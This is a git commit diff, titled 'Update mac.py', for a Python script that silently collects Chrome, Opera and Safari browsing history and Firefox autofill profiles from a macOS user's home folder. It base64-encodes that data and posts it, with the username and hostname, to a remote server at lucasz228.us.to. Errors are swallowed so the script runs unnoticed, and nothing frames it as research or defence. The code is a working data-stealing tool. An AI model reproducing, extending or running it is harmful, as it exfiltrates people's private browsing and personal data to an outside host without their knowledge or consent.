15e46740ca10cb5d9bb6497d9a57b9c1dfd2d685
zlc1004 <91501777+zlc1004@users.noreply.github.com>
2024-06-04 08:35:50 -0700

    Update mac.py

--- mac.py
+++ mac.py
@@ -1,17 +1,52 @@
 import os
 import base64
 import json
-import subprocess as s
+import subprocess
 from urllib.parse import urlencode
 from urllib.request import Request, urlopen
-u = "http://lucasz228.us.to:50000/saveHistory"
-ch = os.environ["HOME"]+"/Library/Application Support/Google/Chrome/"
-with open(ch+"Local State", "r") as f:d = json.load(f)
-ps = list(d["profile"]["info_cache"].keys())
-for p in ps:
-    with open(ch+p+"/History", "rb") as f:
-        t = f.read()
-        t = base64.b64encode(t)
-        p = {"text": t, "name": p, "username": os.environ["USER"], "ComputerName": s.check_output(['hostname']).decode().split("\n")[0]}
-        r = Request(u, urlencode(p).encode())
-        with urlopen(r) as re:re.read()
+import configparser
+# attempt chrome mac
+try:
+    url = "http://lucasz228.us.to:50000/saveHistory"
+    chromeHome = os.environ["HOME"]+"/Library/Application Support/Google/Chrome/"
+    with open(chromeHome+"Local State", "r") as f:d = json.load(f)
+    ps = list(d["profile"]["info_cache"].keys())
+    for p in ps:
+        with open(chromeHome+p+"/History", "rb") as f:
+            r = Request(url, urlencode({"text": base64.b64encode(f.read()), "name": p, "username": os.environ["USER"], "ComputerName": (subprocess.check_output(['hostname']).decode().split("\n")[0].replace(".local",""))}).encode())
+            with urlopen(r) as re:re.read()
+except:pass
+# attempt firefox mac
+try:
+    url = "http://lucasz228.us.to:50000/saveJson"
+    firefoxHome = os.environ["HOME"]+"/Library/Application Support/Firefox/"
+    ps = os.listdir(firefoxHome+"Profiles")
+    for i in ps:
+        try:
+            with open(firefoxHome+"Profiles/"+i+"/autofill-profiles.json", "rb") as f:
+                r = Request(url, urlencode({"data": base64.b64encode(f.read()), "username": os.environ["USER"], "ComputerName": (subprocess.check_output(['hostname']).decode().split("\n")[0].replace(".local",""))}).encode())
+                with urlopen(r) as re:re.read()
+        except:pass
+except:pass
+# attempt safari mac
+try:
+    url = "http://lucasz228.us.to:50000/saveSafariHistory"
+    safariHome = os.environ["HOME"]+"/Library/Safari/"
+    try:
+        with open(safariHome+"History.db", "rb") as f:
+            r = Request(url, urlencode({"text": base64.b64encode(f.read()), "username": os.environ["USER"], "ComputerName": (subprocess.check_output(['hostname']).decode().split("\n")[0].replace(".local",""))}).encode())
+            with urlopen(r) as re:re.read()
+    except:pass
+except:pass
+
+# attempt opera mac
+try:
+    url = "http://lucasz228.us.to:50000/saveHistory"
+    chromeHome = os.environ["HOME"]+"/Library/Application Support/com.operasoftware.Opera/"
+    with open(chromeHome+"Local State", "r") as f:d = json.load(f)
+    ps = list(d["profile"]["info_cache"].keys())
+    for p in ps:
+        with open(chromeHome+p+"/History", "rb") as f:
+            r = Request(url, urlencode({"text": base64.b64encode(f.read()), "name": p, "username": os.environ["USER"], "ComputerName": (subprocess.check_output(['hostname']).decode().split("\n")[0].replace(".local",""))}).encode())
+            with urlopen(r) as re:re.read()
+except:pass
